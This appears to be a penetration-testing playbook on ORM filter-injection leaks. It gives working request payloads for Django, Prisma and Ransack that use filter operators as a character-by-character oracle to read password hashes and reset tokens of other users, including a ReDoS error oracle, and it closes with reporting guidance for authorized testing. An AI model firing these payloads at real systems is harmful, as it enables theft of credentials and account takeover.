# ORM filter-injection leaks — Open WHEN: a list/search endpoint passes user-controlled query params straight into an ORM filter, and you can read fields the UI never shows

An ORM leak happens when an endpoint forwards a user-controlled object/dict
straight into the ORM's filter/where clause. You then use the ORM's own
operators as a blind oracle to read fields you can never see directly —
password hashes, password-reset tokens, API keys on other users' rows.

Signal: a filter/search param whose shape mirrors the ORM (nested keys,
`__`-suffixed operators, JSON `where`/`filter` objects), and a response that
changes (rows returned vs. empty, or 200 vs. 500) based on a field you do not
own.

## Django (`User.objects.filter(**request.data)`)

The `**` unpack lets a request control the filter keyword args. Use lookup
suffixes as a boolean oracle, one character at a time:
```json
{"username": "admin", "password__startswith": "p"}
```
Useful lookups: `__startswith`, `__contains`, `__regex`, plus `__lt` / `__gt`.
Row returned = the guess matched; brute-force the next char.

Relational traversal — reach fields on JOINed models via `__`:
```json
// one-to-one: the user who created an article, password containing "p"
{"created_by__user__password__contains": "p"}
```
Many-to-many needs id-pinning per hop. Enumerate ids, then leak per id:
```json
{"created_by__departments__employees__user__id": 1,
 "created_by__departments__employees__user__password__startswith": "p"}
```

ReDoS error oracle (Django on MySQL) — turn the boolean into a 500 you can see
even when row-diff is hidden. A catastrophic regex times out only when the
prefix matches:
```json
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
// match  -> HTTP 500 "Timeout exceeded in regular expression match"
// no match-> normal response
```

## Prisma (Node.js, `where: req.query.filter`)

Over-fetch entire related rows the serializer would otherwise hide:
```json
{"filter": {"include": {"createdBy": true}}}
{"filter": {"select": {"createdBy": {"select": {"password": true}}}}
```
Relational boolean oracle via query-string nesting:
```
GET /articles?filter[createdBy][resetToken][startsWith]=06
```
`startsWith` / `contains` give the same char-by-char leak as Django.
`elttam/plormber` automates the time-based version.

## Ransack (Ruby, < 4.0.0)

Search predicates become the oracle via `q[<assoc>_<field>_<predicate>]`:
```
GET /posts?q[user_reset_password_token_start]=2   # rows -> token starts "2"
GET /posts?q[user_reset_password_token_start]=2f  # rows -> next char "f"
```
Pin a specific victim with a second predicate:
```
GET /labs?q[creator_roles_name_cont]=superadmin&q[creator_recoveries_key_start]=0
```

## Known CVEs (confirms the class is real, not theoretical)

- CVE-2023-47117 — Label Studio ORM leak
- CVE-2023-31133 — Ghost CMS ORM leak
- CVE-2023-30843 — Payload CMS ORM leak

## Reporting

A single leaked char is not the finding — the finding is "an unauthenticated
boolean oracle exfiltrates field X (password hash / reset token) of arbitrary
users." Prove with 2-3 confirmed characters plus the exact request, then stop;
do not exfiltrate full secrets.
